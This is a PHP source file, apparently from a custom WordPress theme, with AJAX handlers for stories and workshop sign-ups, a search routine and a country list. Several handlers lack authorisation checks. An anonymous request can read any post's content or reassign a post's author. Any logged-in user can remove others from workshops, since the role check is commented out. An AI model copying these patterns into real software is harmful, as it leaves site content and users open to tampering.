add_action('wp_ajax_nopriv_pol_get_story_content', 'pol_get_story_content');
function pol_get_story_content()
{
	$story_id = (int) $_POST['storyID'];
	$story_content = apply_filters('the_content', get_post_field('post_content', $story_id));
	// var_dump($story_content);
	wp_send_json_success(($story_content));
	die();
}



add_action('wp_ajax_pol_remove_story_from_user_list', 'pol_remove_story_from_user_list');
add_action('wp_ajax_nopriv_pol_remove_story_from_user_list', 'pol_remove_story_from_user_list');
function pol_remove_story_from_user_list()
{
	$story_id = (int) $_POST['storyID'];
	$arg = array(
		'ID' => $story_id,
		'post_author' => 8,
	);
	wp_update_post($arg);
	die();
}





add_action('wp_ajax_pol_remove_participants', 'pol_remove_participants');
function pol_remove_participants()
{

	if (!is_user_logged_in()) {
		return;
	}

	$curr_uid = get_current_user_id();
	$curr_user = get_user_by('id', (int) $curr_uid);

	$remove_log = get_option('workshop_user_remove_log') == '' ? [] : get_option('workshop_user_remove_log');

	$current_role = 'user';
	if (get_user_meta((int) $curr_uid, 'rae_approved', true) == 1) {
		$current_role = 'rae';
	} else if (in_array('administrator', (array) $curr_user->roles)) {
		$current_role = 'admin';
	}

	// if($current_role == 'admin' || $current_role == 'rae'){
	$uid = (int)$_POST['userId'];
	$workshop_id = (int)$_POST['workshopId'];

	$user_data = get_userdata($uid);


	$user_name = $user_data->user_login;
	$user_email = $user_data->user_email;
	$action = "remove_from_workshop_sign_up_list";

	$get_all_signups = get_post_meta($workshop_id, 'signups', true);
	$get_all_workshops = get_user_meta($uid, 'workshops', true);

	//remove user from workshop meta
	if (is_array($get_all_signups)) {
		if (($key = array_search($uid, $get_all_signups)) !== false) {
			unset($get_all_signups[$key]);
			update_post_meta($workshop_id, 'signups', array_values($get_all_signups));
			$date_now = date("Y-m-d h:i:sa");
			array_push($remove_log, [$date_now => ['workshop_id' => $workshop_id, 'current_user' => $curr_uid, 'removed_user' => $uid]]);
			update_option('workshop_user_remove_log', $remove_log);
		}
	}

	//remove workshop from usermeta
	if (is_array($get_all_workshops)) {
		if (($key = array_search($workshop_id, $get_all_workshops)) !== false) {
			unset($get_all_workshops[$key]);
			update_user_meta($uid, 'workshops', array_values($get_all_workshops));
		}
	}

	if ((int)$workshop_id != 19293) {
		gotpol_email_template($user_email, $user_name, $workshop_id, $action);
	}

	wp_die();
}





function pol_get_all_stories()
{

	// add_action('pre_get_posts', 'pol_show_published_posts_ajax_search');
	$search_term = '';

	$suggestions = [];

	$pol_ids = [];
	$user_ids = [];
	$user_ids2 = [];
	$author_post_ids = [];
	$author_post_ids2 = [];

	// Create the WP_User_Query object
	$wp_user_query = new WP_User_Query(['search' => '*' . esc_attr($search_term) . '*']);

	// Get the results
	$authors = $wp_user_query->get_results();

	// Check for results
	if (!empty($authors)) {
		// loop through each author
		foreach ($authors as $author) {
			// get all the user's data
			$user_ids[] = $author->ID;
		}

		$user_ids = array_unique($user_ids);
	}

	if (count($user_ids) > 0) {
		$author_args = array(
			'post_type' => array('story'),
			//  'post_type' => array('story','place'),
			'post_status' => 'publish',
			'posts_per_page' => -1,
			'author__in' => $user_ids,
			'fields' => 'ids',
		);

		$author_post_ids = get_posts($author_args);
	}

	// WP_User_Query arguments
	$auth_args = array(
		'meta_query' => array(
			'relation' => 'OR',
			array(
				'key' => 'first_name',
				'value' => '^' . $search_term,
				'compare' => 'REGEXP'
			),
			array(
				'key' => 'last_name',
				'value' => '^' . $search_term,
				'compare' => 'REGEXP'
			)
		)
	);

	// Create the WP_User_Query object
	$wp_user_query2 = new WP_User_Query($auth_args);

	// Get the results
	$authors2 = $wp_user_query2->get_results();


	// WP_User_Query arguments
	$author_args3 = array(
		'post_type' => array('story'),
		'post_status' => 'publish',
		'posts_per_page' => -1,
		'meta_query' => array(
			'relation' => 'OR',
			array(
				'key' => 'story_nom_de_plume',
				'value' => $search_term,
				'compare' => 'REGEXP',
			)
		),
		'fields' => 'ids',
	);

	$author_post_ids3 = get_posts($author_args3);



	// Check for results
	if (!empty($authors2)) {
		// loop through each author
		foreach ($authors as $author2) {
			// get all the user's data
			$user_ids2[] = $author2->ID;
		}

		$user_ids2 = array_unique($user_ids2);
	}

	if (count($user_ids2) > 0) {
		$author_args2 = array(
			'post_type' => array('story'),
			//  'post_type' => array('story','place'),
			'post_status' => 'publish',
			'posts_per_page' => -1,
			'author__in' => $user_ids2,
			'fields' => 'ids',
		);

		$author_post_ids2 = get_posts($author_args2);
	}

	$pol_args = [
		'post_type' => array('story'),
		// 'post_type' => array('story','place'),
		's' => $search_term,
		'search_prod_title' => $search_term,
		'posts_per_page' => -1,
		'post_status' => 'publish',
		'fields' => 'ids',
	];

	$pol_ids = get_posts($pol_args);

	$pol_args = [
		'post_type' => array('story'),
		'posts_per_page' => -1,
		'post_status' => 'publish',
		'fields' => 'ids',
		'meta_query' => array(
			'relation' => 'OR',
			array(
				'key' => 'story_place_name',
				'value' => $search_term,
				'compare' => 'LIKE',
			),
		)
	];

	$pol_ids = array_merge($pol_ids, get_posts($pol_args));

	$pol_args = [
		'post_type' => array('place'),
		'posts_per_page' => -1,
		'post_status' => 'publish',
		'fields' => 'ids',
		'meta_query' => array(
			'relation' => 'OR',
			array(
				'key' => 'place_type',
				'value' => $search_term,
				'compare' => 'LIKE',
			),
			array(
				'key' => 'place_languages',
				'value' => $search_term,
				'compare' => 'LIKE',
			),
			array(
				'key' => 'place_attributes',
				'value' => $search_term,
				'compare' => 'LIKE',
			),
		)
	];

	$pol_ids = array_merge($pol_ids, get_posts($pol_args));

	$pol_ids = array_merge($pol_ids, $author_post_ids);

	$pol_ids = array_merge($pol_ids, $author_post_ids2);

	$pol_ids = array_merge($pol_ids, $author_post_ids3);

	$pol_ids = array_unique($pol_ids);

	$result_count = count($pol_ids);
	$count = 0;
	global $post;

	if ($result_count > 0) {
		foreach ($pol_ids as $pol_id) {
			$post = get_post($pol_id);
			setup_postdata($post);

			//$markerid = false;
			$markerid = "";
			if (get_post_type(get_the_ID()) == 'story') {
				$temp_markerid = get_post_meta(get_the_ID(), 'stories_place', true);
				$suggestions[] = [
					'sid' => get_the_ID(),
					'id' => $temp_markerid,
					'label' => get_the_title(),
					'value' => '',
					'post_id' => get_the_ID(),
					'pt' => get_post_type(get_the_ID()),
					'ps' => get_post_status(get_the_ID()),
					'e' => is_wp_error($markerid),
					'ids' => $pol_ids,
					// 'place_str' => $place_stories,

				];
				$markerid = $temp_markerid;
				$count++;
			} else {
				$markerid = "";
				$count++;
			}

			$count++;
		}

		wp_reset_postdata();
	}

	$suggestions = unique_multidim_array($suggestions, 'post_id');

	if (count($suggestions) < 1) {
		$suggestions[] = [
			'label' => __('No results Found', 'pol'),
			'value' => ''
		];
	}

	return $suggestions;
}


function pol_get_nations()
{
	$nations =
		[
			'Afghanistan',
			'Albania',
			'Algeria',
			'Andorra',
			'Angola',
			'Antigua and Barbuda',
			'Argentina',
			'Armenia',
			'Australia',
			'Austria',
			'Azerbaijan',
			'The Bahamas',
			'Bahrain',
			'Bangladesh',
			'Barbados',
			'Belarus',
			'Belgium',
			'Belize',
			'Benin',
			'Bhutan',
			'Bolivia',
			'Bosnia and Herzegovina',
			'Botswana',
			'Brazil',
			'Brunei',
			'Bulgaria',
			'Burkina Faso',
			'Burundi',
			'Cabo Verde',
			'Cambodia',
			'Cameroon',
			'Canada',
			'Central African Republic',
			'Chad',
			'Chile',
			'China',
			'Colombia',
			'Comoros',
			'Congo, Democratic Republic of the',
			'Congo, Republic of the',
			'Costa Rica',
			'Côte d’Ivoire',
			'Croatia',
			'Cuba',
			'Cyprus',
			'Czech Republic',
			'Denmark',
			'Djibouti',
			'Dominica',
			'Dominican Republic',
			'East Timor (Timor-Leste)',
			'Ecuador',
			'Egypt',
			'El Salvador',
			'Equatorial Guinea',
			'Eritrea',
			'Estonia',
			'Eswatini',
			'Ethiopia',
			'Fiji',
			'Finland',
			'France',
			'Gabon',
			'The Gambia',
			'Georgia',
			'Germany',
			'Ghana',
			'Greece',
			'Grenada',
			'Guatemala',
			'Guinea',
			'Guinea-Bissau',
			'Guyana',
			'Haiti',
			'Honduras',
			'Hungary',
			'Iceland',
			'India',
			'Indonesia',
			'Iran',
			'Iraq',
			'Ireland',
			'Israel',
			'Italy',
			'Jamaica',
			'Japan',
			'Jordan',
			'Kazakhstan',
			'Kenya',
			'Kiribati',
			'Korea, North',
			'Korea, South',
			'Kosovo',
			'Kuwait',
			'Kyrgyzstan',
			'Laos',
			'Latvia',
			'Lebanon',
			'Lesotho',
			'Liberia',
			'Libya',
			'Liechtenstein',
			'Lithuania',
			'Luxembourg',
			'Madagascar',
			'Malawi',
			'Malaysia',
			'Maldives',
			'Mali',
			'Malta',
			'Marshall Islands',
			'Mauritania',
			'Mauritius',
			'Mexico',
			'Micronesia, Federated States of',
			'Moldova',
			'Monaco',
			'Mongolia',
			'Montenegro',
			'Morocco',
			'Mozambique',
			'Myanmar (Burma)',
			'Namibia',
			'Nauru',
			'Nepal',
			'Netherlands',
			'New Zealand',
			'Nicaragua',
			'Niger',
			'Nigeria',
			'North Macedonia',
			'Norway',
			'Oman',
			'Pakistan',
			'Palau',
			'Panama',
			'Papua New Guinea',
			'Paraguay',
			'Peru',
			'Philippines',
			'Poland',
			'Portugal',
			'Qatar',
			'Romania',
			'Russia',
			'Rwanda',
			'Saint Kitts and Nevis',
			'Saint Lucia',
			'Saint Vincent and the Grenadines',
			'Samoa',
			'San Marino',
			'Sao Tome and Principe',
			'Saudi Arabia',
			'Senegal',
			'Serbia',
			'Seychelles',
			'Sierra Leone',
			'Singapore',
			'Slovakia',
			'Slovenia',
			'Solomon Islands',
			'Somalia',
			'South Africa',
			'Spain',
			'Sri Lanka',
			'Sudan',
			'Sudan, South',
			'Suriname',
			'Sweden',
			'Switzerland',
			'Syria',
			'Taiwan',
			'Tajikistan',
			'Tanzania',
			'Thailand',
			'Togo',
			'Tonga',
			'Trinidad and Tobago',
			'Tunisia',
			'Turkey',
			'Turkmenistan',
			'Tuvalu',
			'Uganda',
			'Ukraine',
			'United Arab Emirates',
			'United Kingdom',
			'United States',
			'Uruguay',
			'Uzbekistan',
			'Vanuatu',
			'Vatican City',
			'Venezuela',
			'Vietnam',
			'Yemen',
			'Zambia',
			'Zimbabwe'
		];

	return $nations;
}

//===============================================================
//==================profile helper functions ends================
//===============================================================
